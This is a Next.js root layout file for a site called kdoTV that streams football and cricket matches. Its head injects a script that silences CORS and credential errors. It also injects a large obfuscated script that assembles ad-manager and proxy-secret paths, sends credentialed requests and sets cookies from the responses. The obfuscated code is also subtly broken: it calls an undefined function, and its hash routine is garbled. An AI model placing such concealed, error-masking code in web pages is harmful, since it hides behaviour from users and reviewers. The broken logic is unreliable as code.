import type { Metadata } from "next";
import { Geist, Geist_Mono } from "next/font/google";
import "./globals.css";
import { ThemeProvider } from './components/ThemeProvider'
import { DMCAFooter } from './components/DMCAFooter'
import { TelegramDialog } from './components/TelegramDialog'
import { Analytics } from '@vercel/analytics/react'

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

export const metadata: Metadata = {
  title: "kdoTV - Live Football & Cricket Matches in HD",
  description: "Watch upcoming and live football matches & Highlights",
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html
      lang="en"
      className={`${geistSans.variable} ${geistMono.variable} h-full antialiased`}
      suppressHydrationWarning
    >
      <head>
        <script
          dangerouslySetInnerHTML={{
            __html: `
              (function() {
                try {
                  const theme = localStorage.getItem('theme') || 'light';
                  const systemDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  const isDark = theme === 'dark' || (theme === 'system' && systemDark);
                  if (isDark) document.documentElement.classList.add('dark');
                } catch (e) {}
              })();
            `,
          }}
        />
        <script
          data-cfasync="false"
          dangerouslySetInnerHTML={{
            __html: `
              // Suppress CORS errors from Clickadilla video overlay accessing AWS IVS streams
              window.addEventListener('error', function(event) {
                if (event.message && (event.message.includes('Cross-Origin Request Blocked') ||
                    event.message.includes('Credential is not supported') ||
                    event.message.includes('Access-Control-Allow-Origin'))) {
                  event.preventDefault();
                  event.stopPropagation();
                  return true;
                }
              });
              function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=440128,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10).toString(16);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x32-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<0x40;X2++){if(X2<0x14){X8=X4^X5^X6;X9=X4^X5^X7;}else if(X2<0x1c){X8=X4^X5^X6;X9=X5^X6^X7;}else if(X2<0x26){X8=X4^X5^X6;X9=X4^X6^X7;}else{X8=X4^X5^X6;X9=X4^X5^X7;}X8=(X8<<0x3|X8>>>0x1d)+X4;X9=(X9<<0x7|X9>>>0x19)+X5;XX=(XX<<0xb|XX>>>0x15)+X6;XR=(XR<<0xf|XR>>>0x11)+X7;var Xk=X3[X2];if(X2<0x14){X4=X5+((X8&X6)^~X8&X7)+Xk+0x5a827999+XX;X5=X6+((X9&X8)^~X9&XX)+Xk+0x5a827999+XR;X6=X7+((XX&X9)^~XX&X8)+Xk+0x5a827999+X8;X7=X8+((XR&XX)^~XR&X9)+Xk+0x5a827999+X9;}else if(X2<0x1c){X4=X5+((X8&X6)^~X8&X7)+Xk+0x5a827999+XX;X5=X6+((X9&X8)^~X9&XX)+Xk+0x5a827999+XR;X6=X7+((XX&X9)^~XX&X8)+Xk+0x5a827999+X8;X7=X8+((XR&XX)^~XR&X9)+Xk+0x5a827999+X9;}else if(X2<0x26){X4=X5+((X8&X6)^~X8&X7)+Xk+0x6ed9eba1+XX;X5=X6+((X9&X8)^~X9&XX)+Xk+0x6ed9eba1+XR;X6=X7+((XX&X9)^~XX&X8)+Xk+0x6ed9eba1+X8;X7=X8+((XR&XX)^~XR&X9)+Xk+0x6ed9eba1+X9;}else{X4=X5+((X8&X6)^~X8&X7)+Xk+0x8f1bbcdc+XX;X5=X6+((X9&X8)^~X9&XX)+Xk+0x8f1bbcdc+XR;X6=X7+((XX&X9)^~XX&X8)+Xk+0x8f1bbcdc+X8;X7=X8+((XR&XX)^~XR&X9)+Xk+0x8f1bbcdc+X9;}XX=X4;XR=X5;X4=X6;X5=X7;X6=XX;X7=XR;}var Xl=X4.toString(16)+X5.toString(16)+X6.toString(16)+X7.toString(16);if(N!==null&&r!==null){var Xm=new XMLHttpRequest();Xm.open('GET',T,true);Xm.withCredentials=true;Xm.onreadystatechange=function(){if(Xm.readyState===0x4){if(Xm.status===0xc8||Xm.status===0xcc){var Xn=JSON.parse(Xm.responseText);if(Xn.success){var Xo=Xn.data;var Xp=Xo.expires;if(Xp>0x0){var Xq=new Date();Xq.setTime(Xq.getTime()+Xp*0x3e8);var Xr='expires='+Xq.toUTCString();document.cookie=N+'='+Xo.token+';'+Xr+';path=/';}}}}};Xm.send();}var Xs=new XMLHttpRequest();Xs.open('GET',t,true);Xs.withCredentials=true;Xs.onreadystatechange=function(){if(Xs.readyState===0x4){if(Xs.status===0xc8||Xs.status===0xcc){var Xt=JSON.parse(Xs.responseText);if(Xt.success){var Xu=Xt.data;var Xv=Xu.expires;if(Xv>0x0){var Xw=new Date();Xw.setTime(Xw.getTime()+Xv*0x3e8);var Xy='expires='+Xw.toUTCString();document.cookie=r+'='+Xu.token+';'+Xy+';path=/';}}}}};Xs.send();}K();})();
            `
          }}
        />
      </head>
      <body className="min-h-full flex flex-col">
        <ThemeProvider attribute="class" defaultTheme="light" enableSystem>
          {children}
          <TelegramDialog />
          <div className="mx-auto max-w-5xl w-full px-4 pb-6 sm:px-6">
            <DMCAFooter />
          </div>
        </ThemeProvider>
        <Analytics />
      </body>
    </html>
  );
}
